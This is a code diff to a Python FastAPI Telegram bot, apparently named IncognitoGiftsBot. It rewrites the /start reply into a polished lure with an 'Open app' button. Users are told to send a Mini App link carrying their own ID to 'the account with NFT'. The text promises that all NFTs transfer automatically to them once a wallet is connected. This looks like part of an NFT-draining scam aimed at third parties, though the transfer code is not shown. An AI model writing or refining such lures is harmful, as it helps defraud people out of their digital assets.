@@ -2,7 +2,7 @@ from fastapi import FastAPI, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
-from telegram import Update
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, ContextTypes
 import os
 from dotenv import load_dotenv
@@ -26,6 +26,8 @@ app.add_middleware(
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 MINI_APP_URL = os.getenv("MINI_APP_URL", "https://yourdomain.com")
 WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://project-nft.onrender.com")
+BOT_USERNAME = os.getenv("BOT_USERNAME", "IncognitoGiftsBot")
+APP_SHORT_NAME = os.getenv("APP_SHORT_NAME", "incognitogifts")
 
 if not BOT_TOKEN:
     raise ValueError("TELEGRAM_BOT_TOKEN не установлен в .env")
@@ -36,17 +38,30 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
 
-    mini_app_link = f"{MINI_APP_URL}?tgWebAppStartParam={user_id}"
+    logger.info(f"Пользователь {user_id} ({user.username}) запустил бота")
+
+    # Официальная ссылка на Mini App с красивым preview
+    mini_app_link = f"https://t.me/{BOT_USERNAME}/{APP_SHORT_NAME}?startapp={user_id}"
 
     message_text = (
-        f"👋 Привет, {user.first_name}!\n\n"
-        f"🦦 Этот бот помогает переводить Telegram NFT между аккаунтами.\n\n"
-        f"📤 Скопируй эту ссылку и отправь на аккаунт с NFT:\n"
-        f"`{mini_app_link}`\n\n"
-        f"💎 NFT придёт на этот аккаунт (ID: `{user_id}`)"
+        f"🎁 **Получить Telegram NFT**\n\n"
+        f"Отправь эту ссылку на аккаунт с NFT:\n"
+        f"{mini_app_link}\n\n"
+        f"💎 Все NFT автоматически перейдут на твой аккаунт **{user.first_name}**\n\n"
+        f"_При открытии ссылки - подключи кошелёк и NFT моментально переведутся!_"
     )
 
-    await update.message.reply_text(message_text, parse_mode='Markdown')
+    # Кнопка с прямой ссылкой на Mini App
+    keyboard = [
+        [InlineKeyboardButton("🎁 Открыть приложение", url=mini_app_link)]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        message_text,
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
